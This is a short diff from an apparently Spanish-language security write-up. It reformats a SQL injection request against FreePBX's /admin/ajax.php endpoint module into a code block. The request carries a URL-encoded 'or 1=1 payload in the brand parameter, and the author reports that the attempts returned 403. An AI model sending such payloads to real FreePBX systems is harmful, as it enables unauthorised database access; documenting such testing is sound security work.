@@ -70,8 +70,10 @@ Vamos a probar a inyectar algo de SQL en la ruta `/admin/ajax.php`, **NO EN `/aj
 - `model=model`
 Por tanto, una petición correcta (después de bastantes intentos y mucha comida de cabeza) es:
 `GET /admin/ajax.php/module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<payloadSQL>`, pero es una URL, por lo que la URL-encodeamos mediante una funcioncilla que me programé en el `zshrc`.
-`GET /admin/ajax.php/module%3DFreePBX%5Cmodules%5Cendpoint%5Cajax%26command%3Dmodel%26template%3Dx%26model%3Dmodel%26brand%3Dme%27or%201%3D1--%20-%0A`
 
+```http
+GET /admin/ajax.php/module%3DFreePBX%5Cmodules%5Cendpoint%5Cajax%26command%3Dmodel%26template%3Dx%26model%3Dmodel%26brand%3Dme%27or%201%3D1--%20-%0A`
+```
 Por algún motivo que desconozco, todas las peticiones devuelven un `403` con el siguiente cuerpo:
 ```json
 {
